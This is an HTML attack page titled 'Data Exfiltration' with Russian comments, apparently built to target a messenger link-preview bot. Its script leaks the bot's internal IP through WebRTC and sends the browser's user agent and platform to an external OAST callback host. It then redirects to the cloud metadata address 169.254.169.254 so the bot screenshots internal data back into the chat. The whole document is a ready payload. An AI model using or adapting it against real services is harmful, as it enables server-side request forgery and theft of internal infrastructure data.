<!DOCTYPE html>
<html>
<head><title>Data Exfiltration</title></head>
<body>
<script>
    const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";

    // 1. Утечка внутреннего IP через WebRTC (Классика)
    try {
        var pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (ice) => {
            if (ice && ice.candidate && ice.candidate.candidate) {
                var internalIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
                fetch(`${oast}/webrtc_leak_${internalIP}`);
            }
        };
    } catch(e) { fetch(`${oast}/webrtc_failed`); }

    // 2. Утечка характеристик системы
    const info = btoa(`UA: ${navigator.userAgent}, Plat: ${navigator.platform}`);
    fetch(`${oast}/sys_info?data=${info}`);

    // 3. ТРЮК ДЛЯ ПРЕВЬЮ (Чтобы увидеть "инфу" глазами в чате MAX)
    // Мы ждем 2 секунды, чтобы скрипты выше отработали, 
    // а затем редиректим бота на внутренний ресурс. 
    // Бот сделает скриншот этого ресурса и покажет его ТЕБЕ в чате VK.
    setTimeout(() => {
        window.location.href = "http://169.254.169.254/latest/meta-data/hostname"; 
        // или http://127.0.0.1/server-status
    }, 2500);
</script>
</body>
</html>
